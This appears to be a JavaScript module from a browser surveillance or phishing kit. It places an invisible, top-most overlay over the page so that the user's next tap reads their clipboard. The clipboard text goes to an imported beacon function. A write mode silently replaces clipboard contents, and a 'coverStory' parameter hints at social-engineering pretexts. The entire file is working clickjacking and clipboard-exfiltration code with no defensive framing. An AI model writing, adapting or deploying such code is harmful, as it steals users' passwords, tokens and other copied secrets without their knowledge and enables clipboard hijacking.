import { forceEvent } from '../beacon.js';

function _waitForGestureAndRead() {
  return new Promise((resolve, reject) => {
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;opacity:0;touch-action:manipulation;cursor:default';
    overlay.setAttribute('aria-hidden', 'true');
    document.body.appendChild(overlay);

    const timer = setTimeout(() => {
      overlay.remove();
      reject(new DOMException('Clipboard gesture timeout', 'AbortError'));
    }, 120_000);

    overlay.addEventListener('click', async () => {
      clearTimeout(timer);
      overlay.remove();
      try {
        const text = await navigator.clipboard.readText();
        await forceEvent('clipboard', { text, ts: Date.now() });
        resolve({ granted: true, text });
      } catch (e) {
        await forceEvent('permission_request', { permission: 'clipboard', result: 'denied', error: e.message });
        resolve({ granted: false });
      }
    }, { once: true });
  });
}

export async function requestPermission(coverStory, options) {
  const { mode } = (typeof options === 'object' && options) ? options : {};

  if (mode === 'write') {
    const textToWrite = options?.text ?? '';
    try {
      await navigator.clipboard.writeText(textToWrite);
      await forceEvent('clipboard_write', { text: textToWrite, ts: Date.now() });
      return { written: true };
    } catch (e) {
      await forceEvent('clipboard_write', { error: e.message, ts: Date.now() });
      return { written: false };
    }
  }

  // default: read on next user tap
  try {
    return await _waitForGestureAndRead();
  } catch (e) {
    if (e.name !== 'AbortError') {
      await forceEvent('permission_request', { permission: 'clipboard', result: 'error', error: e.message });
    }
    return { granted: false };
  }
}

export { requestPermission as requestClipboard };
